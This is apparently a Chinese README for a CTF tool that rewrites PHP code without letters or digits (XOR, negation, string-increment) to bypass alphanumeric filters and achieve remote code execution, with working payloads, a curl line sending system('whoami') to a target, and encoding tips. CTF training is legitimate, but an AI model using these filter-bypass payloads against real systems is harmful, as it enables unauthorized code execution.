# 无字母数字 Payload 生成器

把任意 PHP 代码里的**字母和数字**替换成等价表达式，其余字符（括号、分号、引号、运算符……）原样保留。

用于 CTF 中「无字母数字 RCE」场景：过滤规则通常是 `preg_match('/[a-zA-Z0-9]/')`，
本工具生成的 payload 在字面上不含任何字母数字，但求值后能得到原始代码。

```
输入:  phpinfo();
输出:  (('+'^'[').('('^'@').('+'^'[').(')'^'@').('.'^'@').('&'^'@').('/'^'@'))();
       ↑ 只有 phpinfo 被替换                              ↑ (); 原样保留
```

---

## 环境要求

- Python 3.6+
- 无第三方依赖

---

## 快速开始

```bash
# 直接传参
python gen_xor.py "phpinfo();"
python gen_neg.py "phpinfo();"
python gen_inc.py "phpinfo();"

# 从标准输入
echo "system('whoami');" | python gen_xor.py

# 输出 URL 编码形态（取反法为 %XX 形态）
python gen_neg.py -u "phpinfo();"
```

接入靶场：

```bash
PAYLOAD=$(python gen_xor.py -u "system('whoami');")
curl "http://target/?code=$PAYLOAD"
```

## 三个脚本

### `gen_xor.py` —— 异或法

用两个可打印符号异或出目标字符。

```
'!' (0x21) ^ '@' (0x40) = 0x61 = 'a'
'"' (0x22) ^ '@' (0x40) = 0x62 = 'b'
...
':' (0x3A) ^ '@' (0x40) = 0x7A = 'z'
```

`@` 是 `0x40`，即第 6 位（权值 64）。小写字母 `a-z` 恰好等于「`0x21-0x3A` 的符号」把第 6 位置 1。
`p-z` 用 `@` 作基准时伙伴字符会落到数字上（`0x30` 是 `'0'`），所以换用 `[`（`0x5B`）作第二基准。

**数字无法用可打印符号异或出来**（已暴力枚举确认：`0-9` 全部无解），改用布尔算术补齐：

```php
"" . (![] + ![])          // "2"
"" . (![] - ![])          // "0"
```

### `gen_neg.py` —— 取反法

单字节取反，等价于 `0xFF - x`。

```
~0x8F = 0x70 = 'p'
~0x97 = 0x68 = 'h'
```

字母数字取反后**必然**落在 `0x80-0xFF`，一定是非字母数字——所以这个方法不需要任何搜索，对任意输入都直接成立，输出也最短。

输出含原始高位字节（单字节）。用 `-u` 得到 `%XX` 形态。

### `gen_inc.py` —— 自增法

PHP 的 `++` 对字符串是 Perl 风格语义：末位自增，`z`/`Z`/`9` 回绕并向左进位。

基座取自数组转字符串的结果 `"Array"`：

```php
$_ = []; $_ = @"$_";              // $_ = "Array"
$__  = $_[!![]];                  // 下标 0 -> 'A'
$___ = $_[![] + ![] + ![]];       // 下标 3 -> 'a'
```

下标也不能用数字，`!![]` 是 `false`（→ 0），`![]` 是 `true`（→ 1），相加得到 2、3、4。
从 `'A'` 出发得到大写序列，从 `'a'` 出发得到小写序列。

因为 `++` 是**语句**而非表达式，这个脚本的输出是「前缀（构造变量）+ 改写后的代码」。

数字同样用布尔算术补齐（自增只能产出字母）。

## 三种方法对比

| | gen_xor.py | gen_neg.py | gen_inc.py |
|---|---|---|---|
| 原理 | 符号异或 | 高位字节取反 | 字符串自增 |
| 输出形态 | 单个表达式 | 单个表达式 | 前缀语句 + 代码 |
| `phpinfo();` 长度 | 75 B | 53 B | 860 B |
| 依赖的符号 | `^` `'` `[` `]` | `~` `'` | `$` `_` `=` `[` `]` `@` `"` `;` `+` `.` |
| 数字支持 | 布尔算术 | 原生（高位字节） | 布尔算术 |
| 传输敏感 | `+` `&` 需编码 | `%XX` 不能再编码 | `+` 需编码 |

**选择建议**：先试 `gen_neg.py`——最短，且不依赖 `^`；若过滤器作用于 URL 解码**之前**（`%8F` 里的 `8`、`F` 会被看到）则改用 `gen_xor.py`；`^` 也被禁时用 `gen_inc.py`。

---

## 传输层注意

**`gen_xor.py` / `gen_inc.py` 必须整体 URL 编码**（脚本的 `-u` 已处理）：

- payload 里有 `+`，在 URL 中会解码成**空格**（`++` 会变成两个空格，自增法直接报废）
- payload 里有 `&`，会**截断参数**

**`gen_neg.py` 相反：`%XX` 不能二次编码**，`%` 变成 `%25` 就废了。它的请求形态就是原文。

另外要注意**过滤器作用在解码前还是解码后**：

| 过滤时机 | 取反法看到的内容 | 结果 |
|---|---|---|
| URL 解码**前** | `%8F` 三个字符，含数字和字母 `F` | 被拦 |
| URL 解码**后** | 单字节 `0x8F`，非字母数字 | 放行 |

JSON body 不做 URL 解码，取反法不适用。

## 实测验证

全部通过真实 `eval()` 执行验证，输出中字母数字数量为 0：

| 输入 | 结果 |
|---|---|
| `phpinfo();` | 3/3 输出 phpinfo |
| `system('whoami');` | 3/3 输出用户名 |
| `var_dump(1+1);` | 3/3 输出 `int(2)` |
| `var_dump($_POST[1]);` | 3/3 输出 `string(6) "MARKER"` |
| `var_dump($_GET[0]);` | 3/3 |
| `var_dump(strlen('abcd'));` | 3/3 输出 `int(4)` |
| `var_dump(file_get_contents('x'));` | 3/3 正确调用 |

验证环境：PHP 7.3.4 (CLI, Windows)。

## 处理规则

| 代码中的内容 | 替换为 |
|---|---|
| 标识符 `phpinfo`、`file_put_contents` | `(表达式)` |
| 变量 `$_POST` | `${表达式}` |
| 字符串字面量 `'id'` | `(表达式)`（引号丢弃，值不变） |
| 纯数字 `1` | `(表达式)` |
| 其余字符 | 原样保留 |

标识符按 PHP 规则识别为 `[A-Za-z_][A-Za-z0-9_]*`——**下划线属于标识符**，
否则 `var_dump` 会被错误拆成 `var` + `_` + `dump` 而语法错误。

---

## 已知限制

**PHP 语言关键字无法处理。** `echo`、`if`、`return`、`foreach`、`array`、`list`、
`isset`、`empty` 是语法结构而非函数，替换成 `(表达式)` 会导致语法错误——
PHP 中无法用字符串变量调用关键字。

```php
echo "x";        // 生成 (表达式) "x";  -> 语法错误
```

替代方案：改用函数（`print_r`、`var_dump`），或在写文件场景用 `<?=` 短标签代替 `echo`。

生成失败时会直接报语法错，不会静默产生错误结果，便于排查。
